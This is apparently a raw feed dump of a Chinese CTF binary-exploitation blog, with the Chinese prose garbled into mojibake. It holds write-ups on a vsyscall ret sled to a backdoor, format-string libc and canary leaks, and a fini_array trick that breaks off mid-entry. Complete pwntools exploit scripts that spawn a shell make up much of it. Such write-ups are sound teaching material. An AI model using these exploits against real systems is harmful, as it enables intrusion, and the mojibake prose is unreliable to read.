fa-sm"></i></a></p><ul><li>mainå‡½æ•°ï¼Œå¾ˆç®€å•ï¼Œè™½ç„¶æ²¡æœ‰æº¢å‡ºï¼Œä½†æ˜¯æœ‰ä¸ªjmp,ç›´æ¥çœ‹æ±‡ç¼–</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setinit(a1, a2, a3);</span><br><span class="line">  logo();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hack me!\n&quot;</span>, <span class="number">9uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xFF</span>uLL);</span><br><span class="line">  __asm &#123; jmp     qword ptr [rax] &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>å¾ˆç®€å•ï¼Œåªè¦æˆ‘ä»¬ä¿®æ”¹<code>rbp+buf-0x40</code>çš„å€¼ä¸ºåé—¨å‡½æ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥jmpåˆ°åé—¨å‡½æ•°getshelläº†</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000009EB                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000000009F2                 add     rax, 40h ; &#x27;@&#x27;</span><br><span class="line">.text:00000000000009F6                 jmp     qword ptr [rax]</span><br></pre></td></tr></table></figure></div><ul><li>åé—¨å‡½æ•°ï¼š</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_A13</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wtf?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">7uLL</span>);</span><br><span class="line">  buf[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">  system(buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>ä½†æ˜¯çœŸè¿™ä¹ˆç®€å•å—ï¼Ÿchecksec çœ‹çœ‹</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RUNPATH:  b<span class="string">&#x27;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/&#x27;</span></span><br></pre></td></tr></table></figure></div><ul><li>å¯ä»¥å‘ç°å¼€å¯äº†PIEï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥jmpåˆ°åé—¨å‡½æ•°ï¼ŒåŒæ—¶ä¹Ÿæ— æ³•æ³„éœ²PIEï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨vsyscallæ»‘æ¢¯å•Šï¼Œè™½ç„¶ä¸èƒ½ç›´æ¥jmpåˆ°åé—¨å‡½æ•°ï¼Œä½†æ˜¯å¯ä»¥retåˆ°åé—¨å‡½æ•°çš„åœ°æ–¹æ‰§è¡Œ</li></ul><h2 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h2><p>éšä¾¿å‘ä¸ªä¸œè¥¿ä¸‹æ–­ç‚¹ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113192703897.bmp"></p><ul><li>å¯ä»¥å‘ç°æˆ‘ä»¬ä¸€ç›´retåˆ°rbpä¸Šæ–¹å››ä¸ªæœºå™¨å­—é•¿çš„æ—¶å€™ï¼Œå°†è¯¥åœ°å€æœ«å­—èŠ‚æ”¹ä¸º<code>\x13</code>å³å¯è¿›å…¥åˆ°åé—¨å‡½æ•°</li></ul><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;pwn.challenge.ctf.show&quot;,28217)</span></span><br><span class="line">p = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment">#libc = ELF(libc)</span></span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line">vsyscall = <span class="number">0xffffffffff600000</span></span><br><span class="line">ru(<span class="string">&quot;Hack me!\n&quot;</span>)</span><br><span class="line">payload = p64(vsyscall) * <span class="number">30</span></span><br><span class="line">payload += <span class="string">b&#x27;\x13&#x27;</span></span><br><span class="line"></span><br><span class="line">sd(payload)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()  </span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="æ³¨æ„ğŸ¤¨ğŸ¤¨"><a href="#æ³¨æ„ğŸ¤¨ğŸ¤¨" class="headerlink" title="æ³¨æ„ğŸ¤¨ğŸ¤¨"></a>æ³¨æ„ğŸ¤¨ğŸ¤¨</h2><p>æœ€å¼€å§‹æˆ‘payloadç”¨äº†0x40çš„åƒåœ¾æ•°æ®å¡«å……ï¼Œä½†æ˜¯æ˜¯ä¸è¡Œçš„ï¼Œæ€è€ƒä¸€ä¸‹ğŸ¤¯ğŸ¤¯ï¼š</p><ul><li>ç»è¿‡jmp raxé‚£éƒ¨åˆ†æŒ‡ä»¤,rspçš„åœ°å€æ˜¯ä¸ä¼šå‘ç”Ÿæ”¹å˜çš„ï¼Œå³ä½¿æˆ‘ä»¬ä½¿ç”¨<code>vsyscall</code>å³<code>ret</code>(pop rip),ä¹Ÿæ˜¯ä»rspå¼€å§‹å°†æ•°æ®ç»™ripç»§ç»­æ‰§è¡Œï¼Œæ‰€ä»¥ä¸€å¼€å§‹å¡«å……åƒåœ¾æ•°æ®é‚£ä¹ˆä¾¿ä¼šå‡ºç°ä¸‹é¢çš„æƒ…å†µï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113193430206.bmp"></p><p><mark>ä¸‹ä¸€æ­¥<mark></mark></mark></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113193441272.bmp"></p><ul><li>æ‰€ä»¥è¦å°†æ ˆä¸Šçš„æ•°æ®éƒ½å¡«å……ä¸º<code>vsyscall</code>ï¼Œç„¶åæ»‘åˆ°åé—¨å‡½æ•°</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</title>
      <link href="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²</h1><h2 id="1-64ä½æ³„éœ²libcåœ°å€"><a href="#1-64ä½æ³„éœ²libcåœ°å€" class="headerlink" title="1.64ä½æ³„éœ²libcåœ°å€"></a>1.64ä½æ³„éœ²libcåœ°å€</h2><ul><li>å¼€å§‹å‰å¯ä»¥å…ˆå‚è€ƒæˆ‘çš„åšå®¢ï¼š<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/140495295?spm=1001.2014.3001.5502">BUUCTF axb_2019_fmt32 &amp; fmt64_æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²libc-CSDNåšå®¢ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><p><font size="4" color="red">é¢˜ç›® BaseCTF week3-format_string_level2</font></p><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%A0%88%E4%B8%8A-x64.bmp" alt="æ ˆä¸Š-x64"></p><ul><li>å¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæ²¡æœ‰åé—¨å‡½æ•°ï¼Œéœ€è¦æ³„éœ²libcã€‚</li><li>åç§»ç…§æƒ¯ä¾‹æ‰¾å°±è¡Œäº†ï¼Œè¿™é‡Œå°±ä¸å±•ç¤ºäº†ï¼Œ<strong>åç§»æ˜¯6</strong>ï¼Œéœ€è¦æ³¨æ„64ä½å’Œ32åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å®ç°ä»»æ„åœ°å€è¯»çš„åŒºåˆ«ï¼š<strong>64ä½çš„åœ°å€å¤šäº†è®¸å¤š0ï¼Œæ‰€ä»¥å¯¼è‡´ä¸å¯ä»¥åœ¨payloadå‰é¢å¡«è¦è¯»çš„åœ°å€</strong></li></ul><p><font size="4" color="red">ä¸¾ä¾‹ï¼š</font></p><p>payload &#x3D; p64(printf_got) + bâ€™%6$sâ€™ è¿™æ ·å†™åœ¨è¾“å‡ºçš„æ—¶å€™ï¼Œè¯»å®Œprintf_gotå°±ç»“æŸäº†ï¼Œgotè¡¨åœ°å€å°±åªæœ‰ä¸‰å­—èŠ‚ï¼Œåé¢å…¨æ˜¯<strong>è¡¥å…¨çš„\x00,ä¼šå¯¼è‡´printfè¾“å‡ºæˆªæ–­</strong>ï¼Œ<strong>æ‰€ä»¥printf_gotåº”è¯¥æ”¾åœ¨åé¢ã€‚</strong></p><p><font size="4" color="red">é¢˜è§£ï¼š</font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>,<span class="number">49786</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./fmt&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment"># åç§»6</span></span><br><span class="line">payload = <span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(read_got) <span class="comment">#å‰é¢è¡¥å…¨8å­—èŠ‚ï¼Œé˜²æ­¢\x00æˆªæ–­</span></span><br><span class="line">p.send(payload)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;read&#x27;,read_addr)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&quot;</span>)</span><br><span class="line">base = read_addr - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="2-æ³„éœ²canary"><a href="#2-æ³„éœ²canary" class="headerlink" title="2.æ³„éœ²canary"></a>2.æ³„éœ²canary</h2><p><font size="4" color="red">é¢˜ç›® NSSCTF 3rd ezstack:</font></p><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240826120221017.bmp"></p><ul><li>å¯ä»¥å‘ç°å¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯åªå¯ä»¥åˆ©ç”¨ä¸€æ¬¡ï¼Œç”±äº<strong>printfé‡åˆ°\x00æ‰ä¼šåœæ­¢è¾“å‡º</strong>ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼ŒåŠ ä¸Šä»»æ„åœ°å€å¯è¯»çš„æ¼æ´åˆ©ç”¨ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥æ³„éœ²å‡ºcanary</strong>ã€‚</li><li>éš¾ç‚¹å…¶å®åœ¨äº<font size="4" color="red">æ‰¾åç§»</font></li></ul><p><font size="4" color="red">ä»¥æœ¬é¢˜ä¸¾ä¸ªä¾‹å­ï¼š</font></p><p>bufè·ç¦»canary 0x38çš„ä½ç½®ï¼Œåœ¨æ ˆä¸Šå·®è·0x38&#x2F;8&#x3D;7ä¸ªä½ç½®ï¼Œå†åŠ ä¸Š64ä½ä¼ å…¥å‰å…­ä¸ªå‚æ•°ä½äºå¯„å­˜å™¨ä¸­ï¼Œæ‰€ä»¥åç§»å…¶å®æ˜¯<strong>7+6&#x3D;13</strong>ï¼Œç„¶åå°±å¯ä»¥å¼€å§‹å¾—åˆ°canaryï¼Œè¿›è¡Œæ­£å¸¸çš„ret2libcï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># åç§»6+7</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node8.anna.nssctf.cn&quot;,28183)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401303</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;canary challenge\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%13$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+]canary=&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_address &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">LibcSearcher æ²¡æœåˆ°ï¼Œä¸Šç½‘ç«™æ‰¾çš„</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line"><span class="string">base = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="string">system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.31-0ubuntu9.10_amd64.so&quot;</span>)</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;canary challenge\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%13$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+]canary=&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) +p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="3-åªæœ‰ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æœºä¼š"><a href="#3-åªæœ‰ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æœºä¼š" class="headerlink" title="3.åªæœ‰ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æœºä¼š"></a>3.åªæœ‰ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æœºä¼š</h2><h3 id="1-ä¿®æ”¹fini-array"><a href="#1-ä¿®æ”¹fini-array" class="headerlink" title="(1)ä¿®æ”¹fini_array"></a>(1)ä¿®æ”¹fini_array</h3><p><a class="link" href="https://buuoj.cn/challenges#ciscn_2019_sw_1">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="idaé€Ÿè§ˆ"><a href="#idaé€Ÿè§ˆ" class="headerlink" title="idaé€Ÿè§ˆ"></a>idaé€Ÿè§ˆ</h4><ul><li>æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯åªæœ‰ä¸€æ¬¡åˆ©ç”¨çš„æœºä¼š</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h4><ul><li>åªæœ‰ä¸€æ¬¡æ¼æ´åˆ©ç”¨ï¼Œå¾ˆæ˜æ˜¾æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºä¿®æ”¹pirntf_got ä¸ºsystemå°±éœ€è¦ä¸€æ¬¡æ¼æ´åˆ©ç”¨ï¼Œæ‰€ä»¥æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥ä½¿å¾—æ”¹å®Œprintfåå†å›åˆ°mainå‡½æ•°å‘¢ï¼Ÿå…¶å®æ˜¯æœ‰çš„</li></ul><p><img lazyload src="/images/loading.svg" 